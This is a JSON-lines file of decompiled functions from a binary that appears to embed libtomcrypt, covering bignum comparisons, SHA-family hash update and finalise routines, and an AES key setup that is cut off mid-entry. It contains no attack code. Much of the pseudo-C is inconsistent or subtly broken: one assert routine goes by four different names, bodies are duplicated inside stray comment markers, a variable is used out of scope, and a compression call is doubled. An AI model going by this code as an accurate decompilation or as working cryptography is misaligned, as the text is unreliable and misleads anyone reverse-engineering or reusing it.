{"Function Name": "FUN_00411f70", "Address": "00411f70", "Source Code": "undefined4 FUN_00411f70(int *input_array, undefined8 input_value)\n{\n    ulong return_index; \n    \n    if (input_array == (int *)0x0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6794);\n    }\n    \n    \n    if (input_array[2] == 1) {\n        return_index = 0; \n    } else {\n        return_index = 2; \n        \n        if (*input_array < 2) {\n            \n            if (FUN_00405a00(input_array, input_value) + 1U > 2) {\n                return 0; \n            }\n        }\n    }\n    \n    \n    return (&DAT_00438684)[return_index];\n}"}
{"Function Name": "FUN_00411fe0", "Address": "00411fe0", "Source Code": "undefined4 FUN_00411fe0(long first_param,long second_param)\n{\n    \n    if (first_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x6781);\n    }\n    \n    \n    if (second_param == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x6782);\n    }\n    \n    \n    int result = FUN_00406680(first_param,second_param);\n    \n    \n    \n    \n    return (result + 1U < 3) ? *(undefined4 *)(&DAT_00438678 + (ulong)(result + 1U) * 4) : 0;\n}"}
{"Function Name": "FUN_00412060", "Address": "00412060", "Source Code": "undefined4 FUN_00412060(undefined4 *input_pointer)\n{\n    \n    if (input_pointer != (undefined4 *)0x0) {\n        \n        return *input_pointer;\n    }\n    \n    log_error(\"a != NULL\",\"libtomcrypt.c\",0x6779);\n    \n    return default_value;\n}"}
{"Function Name": "FUN_00412090", "Address": "00412090", "Source Code": "undefined8 FUN_00412090(int *input_pointer, int index)\n{\n    \n    if (input_pointer == (int *)0x0) {\n        \n        log_error(\"a != NULL\", \"libtomcrypt.c\", 0x6771);\n    }\n    \n    \n    if (index < *input_pointer && index >= 0) {\n        \n        return *(undefined8 *)(*(long *)(input_pointer + 4) + (long)index * 8);\n    }\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_004120f0", "Address": "004120f0", "Source Code": "void FUN_004120f0(long input_param)\n{\n    \n    if (input_param == 0) {\n        \n        error_handler(\"a != NULL\",\"libtomcrypt.c\",0x676a);\n    }\n    \n    process_input(input_param);\n}"}
{"Function Name": "FUN_00412130", "Address": "00412130", "Source Code": "undefined4 FUN_00412130(long input_param, undefined8 input_param_2)\n{\n    \n    if (input_param == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6765);\n    }\n    \n    \n    int function_result = FUN_00408890(input_param, input_param_2);\n    \n    \n    if (function_result == 0) {\n        \n        return (&result_array)[0];\n    } else if (function_result == -2) {\n        \n        return (&result_array)[2];\n    } else if (function_result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004121b0", "Address": "004121b0", "Source Code": "undefined4 FUN_004121b0(long input_a, long input_b)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6757);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x6758);\n    }\n    \n    \n    int result = FUN_00406750(input_a, input_b);\n    \n    \n    if (result == 0) {\n        \n        return (&data_array)[0];\n    } else if (result == -2) {\n        \n        return (&data_array)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00412250", "Address": "00412250", "Source Code": "undefined4 FUN_00412250(long inputA, long inputB)\n{\n    \n    if (inputA == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6751);\n    }\n    \n    if (inputB == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x6752);\n    }\n    \n    \n    int result = FUN_00407a20(inputA, inputB);\n    \n    \n    if (result == 0) {\n        \n        return (&dataArray)[0];\n    }\n    if (result == -2) {\n        \n        return (&dataArray)[2];\n    }\n    if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004122f0", "Address": "004122f0", "Source Code": "void FUN_004122f0(void *input_param)\n{\n    \n    if (input_param == (void *)0x0) {\n        \n        handle_error(\"a != ((void *)0)\",\"libtomcrypt.c\",0x674b);\n    } else {\n        \n        process_input(input_param);\n        \n        deallocate_memory(input_param);\n    }\n}"}
{"Function Name": "FUN_004123d0", "Address": "004123d0", "Source Code": "undefined8 FUN_004123d0(undefined8 *input_pointer, undefined8 input_value)\n{\n    \n    if (FUN_00412330() != 0) {\n        \n        return 0xd;\n    }\n    \n    return FUN_004121b0(input_value, *input_pointer);\n}"}
{"Function Name": "FUN_004124b0", "Address": "004124b0", "Source Code": "undefined8 FUN_004124b0(long *data_pointer, void *input_pointer, ulong bytes_to_process)\n{\n    uint current_size; \n    undefined8 return_value; \n    ulong bytes_to_copy; \n    void *unused_pointer; \n    \n    if (data_pointer == (long *)0x0) {\n        FUN_00410bc0(\"md != NULL\", \"libtomcrypt.c\", 0x742d);\n    }\n    \n    if (input_pointer == (void *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x742d);\n    }\n    \n    current_size = *(uint *)((long)data_pointer + 0x1c);\n    \n    if (current_size < 0x41) {\n        \n        if (bytes_to_process != 0) {\n            while (true) {\n                \n                if ((current_size == 0) && (0x3f < bytes_to_process)) {\n                    \n                    return_value = FUN_00401b30(data_pointer, input_pointer);\n                    if ((int)return_value != 0) {\n                        return return_value; \n                    }\n                    \n                    bytes_to_process -= 0x40;\n                    \n                    *data_pointer += 0x200;\n                    \n                    input_pointer = (void *)((long)input_pointer + 0x40);\n                } else {\n                    \n                    bytes_to_copy = (bytes_to_process < 0x40 - current_size) ? bytes_to_process : (0x40 - current_size);\n                    \n                    bytes_to_process -= bytes_to_copy;\n                    \n                    memcpy((void *)((long)data_pointer + (ulong)current_size + 0x20), input_pointer, bytes_to_copy);\n                    \n                    *(int *)((long)data_pointer + 0x1c) += (int)bytes_to_copy;\n                    \n                    input_pointer = (void *)((long)input_pointer + bytes_to_copy);\n                    \n                    if (*(int *)((long)data_pointer + 0x1c) == 0x40) {\n                        \n                        return_value = FUN_00401b30(data_pointer, data_pointer + 4);\n                        if ((int)return_value != 0) {\n                            return return_value; \n                        }\n                        \n                        *data_pointer += 0x200;\n                        \n                        *(undefined4 *)((long)data_pointer + 0x1c) = 0;\n                    }\n                }\n                \n                if (bytes_to_process == 0) break;\n                \n                current_size = *(uint *)((long)data_pointer + 0x1c);\n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_004125e0", "Address": "004125e0", "Source Code": "\\*\nundefined  [16] FUN_004125e0(ulong *param_1,long param_2)\n{\n    uint intermediateUintValue; \n    ulong intermediateUlongValue1; \n    ulong intermediateUlongValue2; \n    uint valueAtOffset1C; \n    ulong computedUlongValue; \n    long loopIndex; \n    ulong incrementedValueOfUVar4; \n    undefined returnValueArray [16]; \n    \n    if (param_1 == (ulong *)0x0) {\n        FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x7438); \n    }\n    \n    \n    if (param_2 == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x7439); \n    }\n    \n    \n    valueAtOffset1C = *(uint *)((long)param_1 + 0x1c);\n    \n    \n    if (0x3f < valueAtOffset1C) {\n        returnValueArray._8_4_ = valueAtOffset1C; \n        returnValueArray._0_8_ = 0x10; \n        returnValueArray._12_4_ = 0; \n        return returnValueArray; \n    }\n    \n    incrementedValueOfUVar4 = (ulong)valueAtOffset1C; \n    computedUlongValue = (ulong)(valueAtOffset1C * 8) + *param_1; \n    valueAtOffset1C++; \n    *(uint *)((long)param_1 + 0x1c) = valueAtOffset1C; \n    *param_1 = computedUlongValue; \n    *(undefined *)((long)param_1 + incrementedValueOfUVar4 + 0x20) = 0x80; \n    \n    if (valueAtOffset1C < 0x39) {\n        \n        if (valueAtOffset1C == 0x38) goto LAB_00412652; \n    } else {\n        \n        if (valueAtOffset1C != 0x40) {\n            do {\n                *(undefined *)((long)param_1 + incrementedValueOfUVar4 + 0x20) = 0; \n            } while (++incrementedValueOfUVar4 != 0x40); \n            *(uint *)((long)param_1 + 0x1c) = 0x40; \n        }\n    }\n    \n    FUN_00401b30(param_1,param_1 + 4); \n    *(uint *)((long)param_1 + 0x1c) = 0; \n    computedUlongValue = 0; \n    do {\n        *(undefined *)((long)param_1 + computedUlongValue + 0x20) = 0; \n    } while (++computedUlongValue < 0x38); \n    *(uint *)((long)param_1 + 0x1c) = computedUlongValue; \nLAB_00412652:\n    \n    computedUlongValue = (*param_1 & 0xff000000000000) >> 0x28; \n    intermediateUlongValue1 = (*param_1 & 0xff0000000000) >> 0x18; \n    intermediateUlongValue2 = (*param_1 & 0xff00000000) >> 8;\n    \n    \n    param_1[0xb] = *param_1 >> 0x38 | computedUlongValue | intermediateUlongValue1 | intermediateUlongValue2 | (*param_1 & 0xff000000) << 8 |\n                   (*param_1 & 0xff0000) << 0x18 | (*param_1 & 0xff00) << 0x28 | *param_1 << 0x38;\n    \n    \n    FUN_00401b30(param_1,param_1 + 4,incrementedValueOfUVar4,\n                  *param_1 & 0xffffffff | intermediateUlongValue2 << 8 | intermediateUlongValue1 << 0x18 | computedUlongValue << 0x28 |\n                  (*param_1 >> 0x38) << 0x38);\n    \n    loopIndex = 0; \n    do {\n        valueAtOffset1C = *(uint *)((long)param_1 + loopIndex + 8); \n        intermediateUintValue = (valueAtOffset1C & 0xff0000) >> 8; \n        *(uint *)(param_2 + loopIndex) = valueAtOffset1C >> 0x18 | intermediateUintValue | (valueAtOffset1C & 0xff00) << 8 | valueAtOffset1C << 0x18; \n        loopIndex += 4; \n    } while (loopIndex != 0x14); \n    \n    \n    return ZEXT416(valueAtOffset1C & 0xffff | intermediateUintValue << 8 | (valueAtOffset1C >> 0x18) << 0x18) << 0x40;\n}\n*\\ \n \nundefined  [16] FUN_004125e0(ulong *param_1,long param_2)\n{\nuint intermediateUintValue;\nulong intermediateUlongValue1;\nulong intermediateUlongValue2;\nuint valueAtOffset1C;\nulong computedUlongValue;\nlong loopIndex;\nulong incrementedValueOfUVar4;\nundefined returnValueArray [16];\nif (param_1 == (ulong *)0x0) {\n    FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x7438);\n}\nif (param_2 == 0) {\n    FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x7439);\n}\nvalueAtOffset1C = *(uint *)((long)param_1 + 0x1c);\nif (0x3f < valueAtOffset1C) {\n    returnValueArray._8_4_ = valueAtOffset1C;\n    returnValueArray._0_8_ = 0x10;\n    returnValueArray._12_4_ = 0;\n    return returnValueArray;\n}\nincrementedValueOfUVar4 = (ulong)valueAtOffset1C;\ncomputedUlongValue = (ulong)(valueAtOffset1C * 8) + *param_1;\nvalueAtOffset1C++;\n*(uint *)((long)param_1 + 0x1c) = valueAtOffset1C;\n*param_1 = computedUlongValue;\n*(undefined *)((long)param_1 + incrementedValueOfUVar4 + 0x20) = 0x80;\nif (valueAtOffset1C < 0x39) {\n    if (valueAtOffset1C == 0x38) goto LAB_00412652;\n} else {\n    if (valueAtOffset1C != 0x40) {\n        do {\n            *(undefined *)((long)param_1 + incrementedValueOfUVar4 + 0x20) = 0;\n        } while (++incrementedValueOfUVar4 != 0x40);\n        *(uint *)((long)param_1 + 0x1c) = 0x40;\n    }\n}\nFUN_00401b30(param_1,param_1 + 4);\n*(uint *)((long)param_1 + 0x1c) = 0;\ncomputedUlongValue = 0;\ndo {\n    *(undefined *)((long)param_1 + computedUlongValue + 0x20) = 0;\n} while (++computedUlongValue < 0x38);\n*(uint *)((long)param_1 + 0x1c) = computedUlongValue;\nLAB_00412652:\ncomputedUlongValue = (*param_1 & 0xff000000000000) >> 0x28;\nintermediateUlongValue1 = (*param_1 & 0xff0000000000) >> 0x18;\nintermediateUlongValue2 = (*param_1 & 0xff00000000) >> 8;\nparam_1[0xb] = *param_1 >> 0x38 | computedUlongValue | intermediateUlongValue1 | intermediateUlongValue2 | (*param_1 & 0xff000000) << 8 |\n               (*param_1 & 0xff0000) << 0x18 | (*param_1 & 0xff00) << 0x28 | *param_1 << 0x38;\nFUN_00401b30(param_1,param_1 + 4,incrementedValueOfUVar4,\n              *param_1 & 0xffffffff | intermediateUlongValue2 << 8 | intermediateUlongValue1 << 0x18 | computedUlongValue << 0x28 |\n              (*param_1 >> 0x38) << 0x38);\nloopIndex = 0;\ndo {\n    valueAtOffset1C = *(uint *)((long)param_1 + loopIndex + 8);\n    intermediateUintValue = (valueAtOffset1C & 0xff0000) >> 8;\n    *(uint *)(param_2 + loopIndex) = valueAtOffset1C >> 0x18 | intermediateUintValue | (valueAtOffset1C & 0xff00) << 8 | valueAtOffset1C << 0x18;\n    loopIndex += 4;\n} while (loopIndex != 0x14);\nreturn ZEXT416(valueAtOffset1C & 0xffff | intermediateUintValue << 8 | (valueAtOffset1C >> 0x18) << 0x18) << 0x40;\n}"}
{"Function Name": "FUN_00412800", "Address": "00412800", "Source Code": "undefined8 FUN_00412800(long *param_1, void *param_2, ulong param_3)\n{\n    uint valueAtIndex5; \n    undefined8 returnValue; \n    ulong calculatedSize; \n    void *updatedParam2; \n    \n    if (param_1 == (long *)0x0) {\n        FUN_00410bc0(\"md != NULL\", \"libtomcrypt.c\", 0x7577);\n    }\n    \n    if (param_2 == (void *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x7577);\n    }\n    \n    \n    valueAtIndex5 = *(uint *)(param_1 + 5);\n    \n    \n    if (valueAtIndex5 < 0x41) {\n        \n        if (param_3 != 0) {\n            while (true) {\n                \n                if ((valueAtIndex5 == 0) && (0x3f < param_3)) {\n                    \n                    returnValue = FUN_00401fa0(param_1, param_2);\n                    if ((int)returnValue != 0) {\n                        return returnValue; \n                    }\n                    \n                    param_3 -= 0x40;\n                    *param_1 += 0x200;\n                    param_2 = (void *)((long)param_2 + 0x40);\n                } else {\n                    \n                    calculatedSize = (param_3 < 0x40 - valueAtIndex5) ? param_3 : (0x40 - valueAtIndex5);\n                    updatedParam2 = (void *)((long)param_2 + calculatedSize); \n                    param_3 -= calculatedSize; \n                    \n                    memcpy((void *)((long)param_1 + (ulong)valueAtIndex5 + 0x2c), param_2, calculatedSize);\n                    *(int *)(param_1 + 5) += (int)calculatedSize; \n                    param_2 = updatedParam2; \n                    \n                    \n                    if (*(int *)(param_1 + 5) == 0x40) {\n                        \n                        returnValue = FUN_00401fa0(param_1, (long)param_1 + 0x2c);\n                        if ((int)returnValue != 0) {\n                            return returnValue; \n                        }\n                        *param_1 += 0x200; \n                        *(undefined4 *)(param_1 + 5) = 0; \n                    }\n                }\n                \n                if (param_3 == 0) break;\n                valueAtIndex5 = *(uint *)(param_1 + 5); \n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00412930", "Address": "00412930", "Source Code": "\\*\nundefined [16] FUN_00412930(ulong *data_array,long output_buffer)\n{\n    uint index_value; \n    ulong current_value; \n    ulong calculated_value; \n    long loop_counter; \n    \n    if (data_array == (ulong *)0x0) {\n        FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x7583);\n    }\n    \n    if (output_buffer == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x7584);\n    }\n    \n    \n    index_value = *(uint *)(data_array + 5);\n    \n    \n    if (0x3f < index_value) {\n        return (undefined [16]){0, 0, 0, 0, 0, 0, 0, 0, index_value, 0x10, 0, 0};\n    }\n    \n    \n    calculated_value = (ulong)(index_value * 8) + *data_array;\n    \n    \n    *(uint *)(data_array + 5) = index_value + 1;\n    \n    \n    *data_array = calculated_value;\n    \n    \n    *(undefined *)((long)data_array + index_value + 0x2c) = 0x80;\n    \n    if (index_value >= 0x39) {\n        \n        if (index_value != 0x40) {\n            \n            do {\n                *(undefined *)((long)data_array + index_value + 0x2c) = 0;\n                index_value++;\n            } while (index_value != 0x40);\n            \n            *(uint *)(data_array + 5) = 0x40;\n        }\n    } else {\n        \n        if (index_value == 0x38) goto LAB_004129a2;\n    }\n    \n    FUN_00401fa0(data_array, (long)data_array + 0x2c);\n    \n    \n    *(uint *)(data_array + 5) = 0;\nLAB_004129a2:\n    \n    current_value = *data_array;\n    \n    \n    for (uint loop_index = 0; loop_index < 0x38; loop_index++) {\n        *(undefined *)((long)data_array + loop_index + 0x2c) = 0;\n    }\n    \n    \n    *(uint *)(data_array + 5) = 0x38;\n    \n    ulong extracted_byte_1 = (current_value & 0xff0000000000) >> 0x18;\n    ulong extracted_byte_2 = (current_value & 0xff00000000) >> 8;\n    \n    \n    *(ulong *)((long)data_array + 100) =\n        (current_value >> 0x38) | ((current_value & 0xff000000) << 8) |\n        ((current_value & 0xff0000) << 0x18) | ((current_value & 0xff00) << 0x28) | (current_value << 0x38);\n    \n    \n    FUN_00401fa0(data_array, (long)data_array + 0x2c, index_value,\n        (current_value & 0xffffffff) | (extracted_byte_2 << 8) | (extracted_byte_1 << 0x18) | ((current_value >> 0x38) << 0x38));\n    loop_counter = 0; \n    \n    do {\n        uint temp_value = *(uint *)((long)data_array + loop_counter + 8);\n        *(uint *)(output_buffer + loop_counter) = (temp_value >> 0x18) | ((temp_value & 0xff0000) >> 8) | ((temp_value & 0xff00) << 8) | (temp_value << 0x18);\n        loop_counter += 4; \n    } while (loop_counter != 0x20); \n    \n    return ZEXT416(temp_value & 0xffff | ((temp_value & 0xff0000) >> 8) << 8 | (temp_value >> 0x18) << 0x18) << 0x40;\n}\n*\\ \n \nundefined [16] FUN_00412930(ulong *data_array,long output_buffer)\n{\n    uint index_value;\n    ulong current_value;\n    ulong calculated_value;\n    long loop_counter;\n    if (data_array == (ulong *)0x0) {\n        FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x7583);\n    }\n    if (output_buffer == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x7584);\n    }\n    index_value = *(uint *)(data_array + 5);\n    if (0x3f < index_value) {\n        return (undefined [16]){0, 0, 0, 0, 0, 0, 0, 0, index_value, 0x10, 0, 0};\n    }\n    calculated_value = (ulong)(index_value * 8) + *data_array;\n    *(uint *)(data_array + 5) = index_value + 1;\n    *data_array = calculated_value;\n    *(undefined *)((long)data_array + index_value + 0x2c) = 0x80;\n    if (index_value >= 0x39) {\n        if (index_value != 0x40) {\n            do {\n                *(undefined *)((long)data_array + index_value + 0x2c) = 0;\n                index_value++;\n            } while (index_value != 0x40);\n            *(uint *)(data_array + 5) = 0x40;\n        }\n    } else {\n        if (index_value == 0x38) goto LAB_004129a2;\n    }\n    FUN_00401fa0(data_array, (long)data_array + 0x2c);\n    *(uint *)(data_array + 5) = 0;\nLAB_004129a2:\n    current_value = *data_array;\n    for (uint loop_index = 0; loop_index < 0x38; loop_index++) {\n        *(undefined *)((long)data_array + loop_index + 0x2c) = 0;\n    }\n    *(uint *)(data_array + 5) = 0x38;\n    ulong extracted_byte_1 = (current_value & 0xff0000000000) >> 0x18;\n    ulong extracted_byte_2 = (current_value & 0xff00000000) >> 8;\n    *(ulong *)((long)data_array + 100) =\n        (current_value >> 0x38) | ((current_value & 0xff000000) << 8) |\n        ((current_value & 0xff0000) << 0x18) | ((current_value & 0xff00) << 0x28) | (current_value << 0x38);\n    FUN_00401fa0(data_array, (long)data_array + 0x2c, index_value,\n        (current_value & 0xffffffff) | (extracted_byte_2 << 8) | (extracted_byte_1 << 0x18) | ((current_value >> 0x38) << 0x38));\n    loop_counter = 0;\n    do {\n        uint temp_value = *(uint *)((long)data_array + loop_counter + 8);\n        *(uint *)(output_buffer + loop_counter) = (temp_value >> 0x18) | ((temp_value & 0xff0000) >> 8) | ((temp_value & 0xff00) << 8) | (temp_value << 0x18);\n        loop_counter += 4;\n    } while (loop_counter != 0x20);\n    return ZEXT416(temp_value & 0xffff | ((temp_value & 0xff0000) >> 8) << 8 | (temp_value >> 0x18) << 0x18) << 0x40;\n}"}
{"Function Name": "FUN_00412c40", "Address": "00412c40", "Source Code": "undefined8 FUN_00412c40(long *data_array, void *input_buffer, ulong data_length)\n{\n    ulong current_size; \n    size_t bytes_to_copy;  \n    \n    if (data_array == (long *)0x0) {\n        FUN_00410bc0(\"md != NULL\", \"libtomcrypt.c\", 0x773a);\n    }\n    \n    if (input_buffer == (void *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x773a);\n    }\n    \n    current_size = data_array[9]; \n    \n    if (current_size < 0x81) {\n        \n        if (data_length != 0) {\n            while (true) {\n                \n                if ((current_size == 0) && (0x7f < data_length)) {\n                    \n                    if ((int)FUN_00403da0(data_array, input_buffer) != 0) {\n                        return FUN_00403da0(data_array, input_buffer); \n                    }\n                    data_length -= 0x80; \n                    *data_array += 0x400; \n                    bytes_to_copy = 0x80; \n                } else {\n                    \n                    bytes_to_copy = (data_length < 0x80 - current_size) ? data_length : (0x80 - current_size);\n                    data_length -= bytes_to_copy; \n                    \n                    memcpy((void *)((long)data_array + current_size + 0x50), input_buffer, bytes_to_copy);\n                    data_array[9] += bytes_to_copy; \n                    \n                    if (data_array[9] == 0x80) {\n                        \n                        if ((int)FUN_00403da0(data_array, data_array + 10) != 0) {\n                            return FUN_00403da0(data_array, data_array + 10); \n                        }\n                        *data_array += 0x400; \n                        data_array[9] = 0; \n                    }\n                }\n                \n                if (data_length == 0) break;\n                input_buffer = (void *)((long)input_buffer + bytes_to_copy); \n                current_size = data_array[9]; \n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00412d70", "Address": "00412d70", "Source Code": "\\*\nundefined [16] FUN_00412d70(ulong *param_1,long param_2)\n{\n    ulong intermediateValue; \n    undefined returnValue [16]; \n    ulong loopCounter; \n    ulong bitManipulationValue; \n    long loopIndex; \n    ulong param1Value; \n    ulong param1Element; \n    \n    if (param_1 == (ulong *)0x0) {\n        FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x7746);\n    }\n    \n    if (param_2 == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x7747);\n    }\n    \n    param1Element = param_1[9]; \n    \n    if (0x7f < param1Element) {\n        return (undefined){0x10, param1Element};\n    }\n    \n    \n    param1Value = *param_1 + param1Element * 8; \n    loopCounter = param1Element + 1; \n    *param_1 = param1Value; \n    param_1[9] = loopCounter; \n    *(undefined *)((long)param_1 + param1Element + 0x50) = 0x80; \n    \n    \n    if (0x70 < loopCounter) {\n        if (loopCounter != 0x80) {\n            do {\n                *(undefined *)((long)param_1 + loopCounter + 0x50) = 0; \n                loopCounter++; \n            } while (loopCounter != 0x80); \n            param_1[9] = 0x80; \n        }\n    }\n    \n    \n    FUN_00403da0(param_1,param_1 + 10);\n    param1Value = *param_1; \n    param_1[9] = 0; \n    loopCounter = 0; \n    \n    do {\n        *(undefined *)((long)param_1 + loopCounter + 0x50) = 0;\n    } while (++loopCounter < 0x78); \n    param_1[9] = loopCounter; \n    \n    \n    loopCounter = (param1Value & 0xff000000000000) >> 0x28;\n    bitManipulationValue = (param1Value & 0xff0000000000) >> 0x18;\n    intermediateValue = (param1Value & 0xff00000000) >> 8;\n    param_1[0x19] =\n        param1Value >> 0x38 | loopCounter | bitManipulationValue | intermediateValue | (param1Value & 0xff000000) << 8 |\n        (param1Value & 0xff0000) << 0x18 | (param1Value & 0xff00) << 0x28 | param1Value << 0x38;\n    \n    \n    FUN_00403da0(param_1,param_1 + 10,\n        param1Value & 0xffffffff | intermediateValue << 8 | bitManipulationValue << 0x18 | loopCounter << 0x28 |\n        (param1Value >> 0x38) << 0x38);\n    \n    loopIndex = 0; \n    \n    do {\n        param1Element = *(ulong *)((long)param_1 + loopIndex + 8); \n        loopCounter = (param1Element & 0xff000000000000) >> 0x28; \n        param1Value = (param1Element & 0xff0000000000) >> 0x18; \n        bitManipulationValue = (param1Element & 0xff00000000) >> 8; \n        *(ulong *)(param_2 + loopIndex) =\n            param1Element >> 0x38 | loopCounter | param1Value | bitManipulationValue | (param1Element & 0xff000000) << 8 |\n            (param1Element & 0xff0000) << 0x18 | (param1Element & 0xff00) << 0x28 | param1Element << 0x38; \n        loopIndex += 8; \n    } while (loopIndex != 0x40); \n    \n    returnValue._8_8_ = 0; \n    returnValue._0_8_ = param1Element & 0xffffffff | bitManipulationValue << 8 | param1Value << 0x18 | loopCounter << 0x28 |\n        (param1Element >> 0x38) << 0x38; \n    return returnValue << 0x40; \n}\n*\\ \n \nundefined [16] FUN_00412d70(ulong *param_1,long param_2)\n{\nulong intermediateValue;\nundefined returnValue [16];\nulong loopCounter;\nulong bitManipulationValue;\nlong loopIndex;\nulong param1Value;\nulong param1Element;\nif (param_1 == (ulong *)0x0) {\n    FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x7746);\n}\nif (param_2 == 0) {\n    FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x7747);\n}\nparam1Element = param_1[9];\nif (0x7f < param1Element) {\n    return (undefined){0x10, param1Element};\n}\nparam1Value = *param_1 + param1Element * 8;\nloopCounter = param1Element + 1;\n*param_1 = param1Value;\nparam_1[9] = loopCounter;\n*(undefined *)((long)param_1 + param1Element + 0x50) = 0x80;\nif (0x70 < loopCounter) {\n    if (loopCounter != 0x80) {\n        do {\n            *(undefined *)((long)param_1 + loopCounter + 0x50) = 0;\n            loopCounter++;\n        } while (loopCounter != 0x80);\n        param_1[9] = 0x80;\n    }\n}\nFUN_00403da0(param_1,param_1 + 10);\nparam1Value = *param_1;\nparam_1[9] = 0;\nloopCounter = 0;\ndo {\n    *(undefined *)((long)param_1 + loopCounter + 0x50) = 0;\n} while (++loopCounter < 0x78);\nparam_1[9] = loopCounter;\nloopCounter = (param1Value & 0xff000000000000) >> 0x28;\nbitManipulationValue = (param1Value & 0xff0000000000) >> 0x18;\nintermediateValue = (param1Value & 0xff00000000) >> 8;\nparam_1[0x19] =\n    param1Value >> 0x38 | loopCounter | bitManipulationValue | intermediateValue | (param1Value & 0xff000000) << 8 |\n    (param1Value & 0xff0000) << 0x18 | (param1Value & 0xff00) << 0x28 | param1Value << 0x38;\nFUN_00403da0(param_1,param_1 + 10,\n    param1Value & 0xffffffff | intermediateValue << 8 | bitManipulationValue << 0x18 | loopCounter << 0x28 |\n    (param1Value >> 0x38) << 0x38);\nloopIndex = 0;\ndo {\n    param1Element = *(ulong *)((long)param_1 + loopIndex + 8);\n    loopCounter = (param1Element & 0xff000000000000) >> 0x28;\n    param1Value = (param1Element & 0xff0000000000) >> 0x18;\n    bitManipulationValue = (param1Element & 0xff00000000) >> 8;\n    *(ulong *)(param_2 + loopIndex) =\n        param1Element >> 0x38 | loopCounter | param1Value | bitManipulationValue | (param1Element & 0xff000000) << 8 |\n        (param1Element & 0xff0000) << 0x18 | (param1Element & 0xff00) << 0x28 | param1Element << 0x38;\n    loopIndex += 8;\n} while (loopIndex != 0x40);\nreturnValue._8_8_ = 0;\nreturnValue._0_8_ = param1Element & 0xffffffff | bitManipulationValue << 8 | param1Value << 0x18 | loopCounter << 0x28 |\n    (param1Element >> 0x38) << 0x38;\nreturn returnValue << 0x40;\n}"}
{"Function Name": "FUN_00413070", "Address": "00413070", "Source Code": "undefined8 FUN_00413070(uint *param_1,uint param_2,int param_3,uint *param_4)\n{\nuint uVar1;\nuint uVar2;\nuint *puVar3;\nuint *puVar4;\nlong lVar5;\nuint *puVar6;\nint iVar7;\nuint *puVar8;\nif (param_1 == (uint *)0x0) {\nFUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x7d48);\n}\nif (param_4 == (uint *)0x0) {\nFUN_00410bc0(\"skey != NULL\",\"libtomcrypt.c\",0x7d49);\n}\nif (((param_2 & 0xfffffff7) != 0x10) && (param_2 != 0x20)) {\nreturn 3;\n}\nif (param_3 != 0) {\nuVar1 = param_2;\nif ((int)param_2 < 0) {\nuVar1 = param_2 + 7;\n}\nif (((int)uVar1 >> 3) * 2 + 6 != param_3) {\nreturn 4;\n}\n}\nuVar1 = param_2 + 7;\nif (-1 < (int)param_2) {\nuVar1 = param_2;\n}\nparam_4[0x78] = ((int)uVar1 >> 3) * 2 + 6;\nuVar1 = *param_1;\n*param_4 = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nuVar1 = param_1[1];\nparam_4[1] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nuVar1 = param_1[2];\nparam_4[2] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nuVar1 = param_1[3];\nparam_4[3] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nif (param_2 == 0x10) {\nlVar5 = 0;\npuVar3 = param_4;\nwhile( true ) {\nuVar1 = puVar3[3];\npuVar8 = (uint *)((long)&DAT_00439100 + lVar5);\nlVar5 = lVar5 + 4;\nuVar2 = *puVar8 ^ *puVar3 ^ *(uint *)(&DAT_0043b540 + (ulong)(uVar1 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043ad40 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b140 + (ulong)(uVar1 >> 8 & 0xff) * 4);\npuVar3[4] = uVar2;\nuVar2 = uVar2 ^ puVar3[1];\npuVar3[5] = uVar2;\nuVar2 = uVar2 ^ puVar3[2];\npuVar3[6] = uVar2;\npuVar3[7] = uVar2 ^ uVar1;\nif (lVar5 == 0x28) break;\npuVar3 